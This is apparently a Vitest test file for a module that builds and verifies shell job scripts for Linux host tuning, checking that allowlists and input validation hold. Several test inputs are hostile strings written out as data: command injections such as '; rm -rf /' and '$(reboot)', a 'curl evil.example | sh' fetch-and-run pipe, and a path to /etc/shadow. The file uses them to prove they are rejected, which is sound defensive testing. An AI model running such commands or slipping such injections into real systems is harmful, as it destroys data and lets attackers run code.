import { describe, expect, it } from "vitest"
import { buildCommands, buildJobScript, parseVerification, type ApplyTarget } from "./tuning-commands"

describe("buildCommands allowlist validation", () => {
  it("accepts a known-safe kernel-param", () => {
    const cmds = buildCommands({ kind: "kernel-param", param: "net.ipv4.ip_forward", value: "1" })
    expect(cmds.some((c) => c.includes("sysctl -w net.ipv4.ip_forward=") )).toBe(true)
  })

  it("rejects a kernel-param with shell metacharacters in the param name", () => {
    expect(() =>
      buildCommands({ kind: "kernel-param", param: "net.ipv4.ip_forward; rm -rf /", value: "1" }),
    ).toThrow(/invalid param/)
  })

  it("rejects a kernel-param value with shell metacharacters", () => {
    expect(() =>
      buildCommands({ kind: "kernel-param", param: "net.ipv4.ip_forward", value: "1; curl evil.example" }),
    ).toThrow(/invalid value/)
  })

  it("rejects a kernel-module not on the allowlist", () => {
    expect(() => buildCommands({ kind: "kernel-module", module: "evil_module" })).toThrow(/module not allowed/)
  })

  it("accepts an allowlisted kernel-module", () => {
    expect(() => buildCommands({ kind: "kernel-module", module: "overlay" })).not.toThrow()
  })

  it("rejects a malformed ulimit value", () => {
    expect(() =>
      buildCommands({ kind: "ulimit", name: "nofile", scope: "soft", value: "$(reboot)" }),
    ).toThrow(/invalid ulimit value/)
  })

  it("accepts a numeric ulimit value", () => {
    expect(() =>
      buildCommands({ kind: "ulimit", name: "nofile", scope: "hard", value: "65536" }),
    ).not.toThrow()
  })

  it("rejects a package not on the allowlist", () => {
    expect(() => buildCommands({ kind: "package", name: "netcat-traditional" })).toThrow(/package not allowed/)
  })

  it("rejects a service not on the allowlist", () => {
    expect(() => buildCommands({ kind: "service-enable", service: "sshd" })).toThrow(/service not allowed/)
  })

  it("rejects an ethtool iface with unsafe characters", () => {
    expect(() =>
      buildCommands({ kind: "ethtool", iface: "eth0; id", rx: 512, tx: 512 }),
    ).toThrow(/invalid iface/)
  })

  it("rejects ethtool rx/tx out of bounds", () => {
    expect(() => buildCommands({ kind: "ethtool", iface: "eth0", rx: 0, tx: 512 })).toThrow(/invalid rx/)
    expect(() => buildCommands({ kind: "ethtool", iface: "eth0", rx: 512, tx: 999999 })).toThrow(/invalid tx/)
  })

  it("rejects a tuning-script not on the allowlist — the arbitrary-script escape hatch stays closed", () => {
    expect(() =>
      buildCommands({ kind: "tuning-script", script: "../../etc/shadow" }),
    ).toThrow(/script not allowed/)
    expect(() =>
      buildCommands({ kind: "tuning-script", script: "curl evil.example | sh" }),
    ).toThrow(/script not allowed/)
  })

  it("accepts an allowlisted tuning-script", () => {
    expect(() => buildCommands({ kind: "tuning-script", script: "05-disk-tuning.sh" })).not.toThrow()
  })

  it("swap-off takes no parameters and always succeeds validation", () => {
    expect(() => buildCommands({ kind: "swap-off" })).not.toThrow()
  })
})

describe("buildJobScript", () => {
  it("fails fast on the first invalid target instead of building a partial script", () => {
    const targets: ApplyTarget[] = [
      { kind: "swap-off" },
      { kind: "package", name: "not-on-the-list" },
    ]
    expect(() => buildJobScript(targets)).toThrow(/package not allowed/)
  })

  it("interleaves an apply block and a verify marker per target, in order", () => {
    const script = buildJobScript([
      { kind: "kernel-param", param: "net.ipv4.ip_forward", value: "1" },
      { kind: "swap-off" },
    ])
    const idx0 = script.indexOf("NARWHAL_VERIFY_0=")
    const idx1 = script.indexOf("NARWHAL_VERIFY_1=")
    expect(idx0).toBeGreaterThan(-1)
    expect(idx1).toBeGreaterThan(idx0)
  })
})

describe("parseVerification", () => {
  it("matches a kernel-param whose re-read value equals the requested value", () => {
    const targets: ApplyTarget[] = [{ kind: "kernel-param", param: "net.ipv4.ip_forward", value: "1" }]
    const logs = "NARWHAL_VERIFY_0=1\n"
    expect(parseVerification(logs, targets)).toEqual([
      { index: 0, kind: "kernel-param", ok: true, detail: "1" },
    ])
  })

  it("flags a kernel-param whose re-read value does not match", () => {
    const targets: ApplyTarget[] = [{ kind: "kernel-param", param: "net.ipv4.ip_forward", value: "1" }]
    const logs = "NARWHAL_VERIFY_0=0\n"
    expect(parseVerification(logs, targets)[0].ok).toBe(false)
  })

  it("flags a missing marker (e.g. the script aborted on an earlier target) as not ok", () => {
    const targets: ApplyTarget[] = [{ kind: "swap-off" }]
    expect(parseVerification("", targets)).toEqual([
      { index: 0, kind: "swap-off", ok: false, detail: "" },
    ])
  })

  it("requires active+enabled for service-enable, not just active", () => {
    const targets: ApplyTarget[] = [{ kind: "service-enable", service: "containerd" }]
    expect(parseVerification("NARWHAL_VERIFY_0=active/enabled\n", targets)[0].ok).toBe(true)
    expect(parseVerification("NARWHAL_VERIFY_0=active/disabled\n", targets)[0].ok).toBe(false)
  })

  it("treats swap-off as verified only when swapon reports zero entries", () => {
    const targets: ApplyTarget[] = [{ kind: "swap-off" }]
    expect(parseVerification("NARWHAL_VERIFY_0=0\n", targets)[0].ok).toBe(true)
    expect(parseVerification("NARWHAL_VERIFY_0=1\n", targets)[0].ok).toBe(false)
  })

  it("treats ethtool as evidence-only: any non-error readback counts as ok", () => {
    const targets: ApplyTarget[] = [{ kind: "ethtool", iface: "eth0", rx: 512, tx: 512 }]
    expect(parseVerification("NARWHAL_VERIFY_0=Current hardware settings: RX: 512 TX: 512;\n", targets)[0].ok).toBe(true)
    expect(parseVerification("NARWHAL_VERIFY_0=__ERR__\n", targets)[0].ok).toBe(false)
  })
})
